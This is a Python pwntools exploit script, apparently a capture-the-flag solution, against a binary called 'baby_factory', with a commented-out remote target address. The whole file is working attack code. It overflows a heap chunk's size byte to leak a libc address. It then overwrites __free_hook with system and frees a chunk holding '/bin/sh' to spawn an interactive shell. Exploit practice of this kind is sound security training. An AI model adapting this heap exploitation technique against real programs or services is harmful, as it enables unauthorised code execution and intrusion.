#!/usr/bin/python2
# -*- coding:utf-8 -*-

from pwn import *
import os
import struct
import random
import time
import sys
import signal

salt = os.getenv('GDB_SALT') if (os.getenv('GDB_SALT')) else ''

def clear(signum=None, stack=None):
    print('Strip  all debugging information')
    os.system('rm -f /tmp/gdb_symbols{}* /tmp/gdb_pid{}* /tmp/gdb_script{}*'.replace('{}', salt))
    exit(0)

for sig in [signal.SIGINT, signal.SIGHUP, signal.SIGTERM]: 
    signal.signal(sig, clear)

# # Create a symbol file for GDB debugging
# try:
#     gdb_symbols = '''

#     '''

#     f = open('/tmp/gdb_symbols{}.c'.replace('{}', salt), 'w')
#     f.write(gdb_symbols)
#     f.close()
#     os.system('gcc -g -shared /tmp/gdb_symbols{}.c -o /tmp/gdb_symbols{}.so'.replace('{}', salt))
#     # os.system('gcc -g -m32 -shared /tmp/gdb_symbols{}.c -o /tmp/gdb_symbols{}.so'.replace('{}', salt))
# except Exception as e:
#     print(e)

context.arch = 'amd64'
# context.arch = 'i386'
context.log_level = 'debug'
execve_file = './baby_factory'
# sh = process(execve_file, env={'LD_PRELOAD': '/tmp/gdb_symbols{}.so'.replace('{}', salt)})
sh = process(execve_file)
# sh = remote('137.117.216.128', 13373)
elf = ELF(execve_file)
# libc = ELF('./libc-2.27.so')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

# Create temporary files for GDB debugging
try:
    gdbscript = '''
    
    '''

    f = open('/tmp/gdb_pid{}'.replace('{}', salt), 'w')
    f.write(str(proc.pidof(sh)[0]))
    f.close()

    f = open('/tmp/gdb_script{}'.replace('{}', salt), 'w')
    f.write(gdbscript)
    f.close()
except Exception as e:
    pass

BOY = 0
GIRL = 1

def Create(type, content):
    sh.sendlineafter('> ', '1')
    sh.sendlineafter('> ', str(type + 1))
    sh.sendafter('Name: ', content)
    sh.sendlineafter('Day: ', str(0xffffff))

def Edit(index, content):
    sh.sendlineafter('> ', '2')
    sh.sendlineafter('IDX: ', str(index))
    sh.sendafter('name: ', content)

def List():
    sh.sendlineafter('> ', '3')

def Eliminate(index):
    sh.sendlineafter('> ', '4')
    sh.sendlineafter('IDX: ', str(index))

pause()
Create(BOY, '\n')
Create(BOY, '\n')
Create(BOY, '\n')
Edit(0, 'a' * 0x68 + p8(0x91))
Eliminate(0)
Eliminate(1)
Create(GIRL, '\xf8')
List()
sh.recvuntil('GIRL= ')
result = sh.recvuntil('Date', drop=True)
libc_addr = u64(result.ljust(8, '\0')) - 0x3c4bf8
log.success('libc_addr: ' + hex(libc_addr))
Create(BOY, 'b' * 0x60)
Create(GIRL, (p64(0) + p64(0x21)) * 6)
Edit(2, 'd' * 0x68 + p8(0xa1))
# pause()
Eliminate(1)
Create(GIRL, p64(libc_addr + libc.symbols['__free_hook']) + p64(0))
Edit(3, p64(libc_addr + libc.symbols['system']))
Edit(1, p64(libc_addr + libc.search('/bin/sh\0').next()))
Eliminate(3)

sh.interactive()
clear()